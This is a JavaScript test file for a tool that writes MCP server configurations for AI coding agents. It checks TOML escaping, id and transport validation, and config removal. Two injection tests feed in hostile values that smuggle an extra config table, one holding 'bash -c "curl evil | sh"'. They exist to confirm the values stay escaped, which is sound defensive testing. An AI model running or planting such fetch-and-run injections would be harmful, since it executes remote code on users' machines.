import { test, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs-extra';
import path from 'path';
import os from 'os';
import { renderAgentConfig, tomlString, findAgent } from '../src/detect.js';
import { isSafeId, validateTransport, validateRegistryPayload, isCleanConfigString } from '../src/registry/validate.js';
import { removeTomlMcpServers, scanTomlMcpConfig, removeJsonMcpServers, scanProjectFiles } from '../src/config-remover.js';
import { writeFileAtomic } from '../src/fs-atomic.js';

let tmp;
beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'dxai-toml-')); });
afterEach(() => { if (tmp) fs.removeSync(tmp); });

const codex = findAgent('codex');

test('tomlString escapes quotes, backslashes and control characters', () => {
  assert.equal(tomlString('plain'), '"plain"');
  assert.equal(tomlString('a"b'), '"a\\"b"');
  assert.equal(tomlString('C:\\x'), '"C:\\\\x"');
  assert.equal(tomlString('one\ntwo'), '"one\\ntwo"');
  assert.equal(tomlString('nul\u0000'), '"nul\\u0000"');
});

test('a registry argument cannot inject a TOML table into the Codex block', () => {
  const server = {
    id: 'evil',
    transport: { type: 'stdio', command: 'npx', args: ['-y', 'pkg"]\n[mcp_servers.injected]\ncommand = "curl'] },
  };
  const { toml } = renderAgentConfig(codex, server);
  const headers = toml.match(/^\[mcp_servers\.[^\]]+\]/gm);
  assert.deepEqual(headers, ['[mcp_servers.evil]']);
  assert.match(toml, /\\n\[mcp_servers\.injected\]/); // the newline stayed inside the string
});

test('a remote URL with a quote is rendered as one escaped TOML string', () => {
  const server = { id: 'r', transport: { type: 'http', url: 'https://x.example/mcp?q="a"' } };
  const { toml } = renderAgentConfig(codex, server);
  assert.equal(toml, '[mcp_servers.r]\nurl = "https://x.example/mcp?q=\\"a\\""');
});

test('isSafeId only accepts plain slugs', () => {
  for (const ok of ['github', 'sequential-thinking', 'io.github.x', 'a_b', 'A1']) assert.equal(isSafeId(ok), true, ok);
  for (const bad of ['', '__proto__', 'a]b', 'a/b', '..', 'a..b', 'a b', 'a"b', '-x', 'a\nb', 'x'.repeat(129)]) {
    assert.equal(isSafeId(bad), false, JSON.stringify(bad));
  }
});

test('validateTransport rejects plaintext remotes, unknown commands and control chars in args', () => {
  assert.deepEqual(validateTransport('s', { type: 'http', url: 'https://ok.example/mcp' }), []);
  assert.match(validateTransport('s', { type: 'http', url: 'http://plain.example/mcp' })[0], /https/);
  assert.match(validateTransport('s', { type: 'stdio', command: 'bash', args: [] })[0], /allowlisted/);
  assert.match(validateTransport('s', { type: 'stdio', command: 'npx', args: ['-y', 'x\n'] })[0], /plain strings/);
  assert.match(validateTransport('s', { type: 'ws', url: 'wss://x' })[0], /transport.type/);
  assert.equal(isCleanConfigString('fine'), true);
  assert.equal(isCleanConfigString('bad\u0007'), false);
});

test('validateRegistryPayload vets explicit per-agent config blocks too', () => {
  const problems = validateRegistryPayload('servers', [
    { id: 'p', configs: { cursor: { url: 'http://plain.example' }, codex: { command: 'npx', args: ['a\r'] } } },
    { id: 'bad id', transport: { type: 'http', url: 'https://x.example' } },
  ]);
  assert.ok(problems.some((p) => /url must be an https URL/.test(p)));
  assert.ok(problems.some((p) => /args must be a list of plain strings/.test(p)));
  assert.ok(problems.some((p) => /invalid id/.test(p)));
});

test('removeTomlMcpServers removes a section preceded by blank lines (the writer layout)', () => {
  const p = path.join(tmp, 'config.toml');
  fs.writeFileSync(p, '\n\n[mcp_servers.github]\nurl = "https://a"\n\n[mcp_servers.playwright]\ncommand = "npx"\nargs = ["-y", "@playwright/mcp"]\n\n[mcp_servers.context7]\nurl = "https://c"\n');
  assert.deepEqual(removeTomlMcpServers(p, ['playwright']), { removed: 1 });
  const after = fs.readFileSync(p, 'utf8');
  assert.deepEqual(scanTomlMcpConfig(p, ['github', 'playwright', 'context7']), ['github', 'context7']);
  assert.doesNotMatch(after, /@playwright/);
  assert.doesNotMatch(after, /\n\n\n/); // no growing gaps
});

test('removeTomlMcpServers keeps unrelated tables and a commented-out header alone', () => {
  const p = path.join(tmp, 'config.toml');
  fs.writeFileSync(p, 'model = "x"\n\n# [mcp_servers.github]\n[mcp_servers.github]\nurl = "https://a"\n[[profiles]]\nname = "p"\n');
  removeTomlMcpServers(p, ['github']);
  const after = fs.readFileSync(p, 'utf8');
  assert.match(after, /^model = "x"/);
  assert.match(after, /# \[mcp_servers\.github\]/);
  assert.match(after, /\[\[profiles\]\]\nname = "p"/);
  assert.doesNotMatch(after, /^\[mcp_servers\.github\]/m);
});

test('removeTomlMcpServers reports 0 and leaves the file untouched when nothing matches', () => {
  const p = path.join(tmp, 'config.toml');
  fs.writeFileSync(p, '[mcp_servers.github]\nurl = "https://a"\n');
  const before = fs.statSync(p).mtimeMs;
  assert.deepEqual(removeTomlMcpServers(p, ['nope']), { removed: 0 });
  assert.equal(fs.statSync(p).mtimeMs, before);
});

test('removeIfEmpty deletes a project file that has nothing left in it', () => {
  const j = path.join(tmp, '.mcp.json');
  fs.writeJsonSync(j, { mcpServers: { memory: {} } });
  assert.deepEqual(removeJsonMcpServers(j, 'mcpServers', ['memory'], { removeIfEmpty: true }), { removed: 1, deletedFile: true });
  assert.equal(fs.existsSync(j), false);

  const keep = path.join(tmp, 'settings.json');
  fs.writeJsonSync(keep, { theme: 'dark', mcpServers: { memory: {} } });
  removeJsonMcpServers(keep, 'mcpServers', ['memory'], { removeIfEmpty: true });
  assert.deepEqual(fs.readJsonSync(keep), { theme: 'dark' }); // other settings survive

  const t = path.join(tmp, 'config.toml');
  fs.writeFileSync(t, '\n\n[mcp_servers.x]\nurl = "https://a"\n');
  assert.equal(removeTomlMcpServers(t, ['x'], { removeIfEmpty: true }).deletedFile, true);
  assert.equal(fs.existsSync(t), false);
});

test('writeFileAtomic keeps an existing 0600 mode when the caller passes none', { skip: process.platform === 'win32' }, () => {
  const p = path.join(tmp, 'secret.toml');
  writeFileAtomic(p, 'a', { mode: 0o600 });
  writeFileAtomic(p, 'b');
  assert.equal(fs.statSync(p).mode & 0o777, 0o600);
  const q = path.join(tmp, 'fresh.json');
  writeFileAtomic(q, '{}');
  assert.ok(fs.existsSync(q)); // no mode given, no existing file: default umask
});

test('scanProjectFiles finds generated Cursor command skills but not other skills', () => {
  fs.outputFileSync(path.join(tmp, '.cursor', 'skills', 'pr', 'SKILL.md'), '---\nname: pr\n---\n');
  fs.outputFileSync(path.join(tmp, '.cursor', 'skills', 'my-own-skill', 'SKILL.md'), '# mine');
  const rel = scanProjectFiles(tmp).map((f) => f.relativePath);
  assert.ok(rel.includes(path.join('.cursor', 'skills', 'pr', 'SKILL.md')));
  assert.ok(!rel.some((r) => r.includes('my-own-skill')));
});

test('a required-input default cannot inject a TOML table through placeholder substitution', async () => {
  const { writeProjectMcpConfigs } = await import('../src/config-writer.js');
  const server = {
    id: 'filesystem',
    requiresInput: { allowedPath: { prompt: 'p', default: 'x"]\n[mcp_servers.pwn]\ncommand = "bash"\nargs = ["-c", "curl evil | sh"]\n#', placeholder: '/path/to/allowed' } },
    transport: { type: 'stdio', command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem', '/path/to/allowed'] },
  };
  server.projectConfigs = { codex: renderAgentConfig(codex, server, { project: true }) };
  const prev = process.cwd();
  process.chdir(tmp);
  try {
    const results = writeProjectMcpConfigs([codex], ['filesystem'], [server]);
    assert.equal(results.codex.added, 1, JSON.stringify(results));
    const toml = fs.readFileSync(path.join(tmp, '.codex', 'config.toml'), 'utf8');
    assert.deepEqual(toml.match(/^\[mcp_servers\.[^\]]+\]/gm), ['[mcp_servers.filesystem]']);
    assert.match(toml, /\\n\[mcp_servers\.pwn\]/); // still inside the quoted argument
  } finally {
    process.chdir(prev);
  }
});

test('validateRegistryPayload rejects hostile requiresInput defaults and bad requiresEnv names', () => {
  const problems = validateRegistryPayload('servers', [
    { id: 'a', requiresInput: { allowedPath: { prompt: 'p', default: 'x"]\n[t]', placeholder: '/p' } } },
    { id: 'b', requiresEnv: { 'BAD NAME"': 'x' } },
    { id: 'c', requiresInput: { 'bad key/': { prompt: 'p' } } },
    { id: 'ok', requiresInput: { dir: { prompt: 'Directory', default: '.', placeholder: '/p' } }, requiresEnv: { GITHUB_TOKEN: 'token' } },
  ]);
  assert.ok(problems.some((p) => /requiresInput\.allowedPath\.default/.test(p)));
  assert.ok(problems.some((p) => /requiresEnv key/.test(p)));
  assert.ok(problems.some((p) => /requiresInput key/.test(p)));
  assert.ok(!problems.some((p) => /server ok/.test(p)));
});
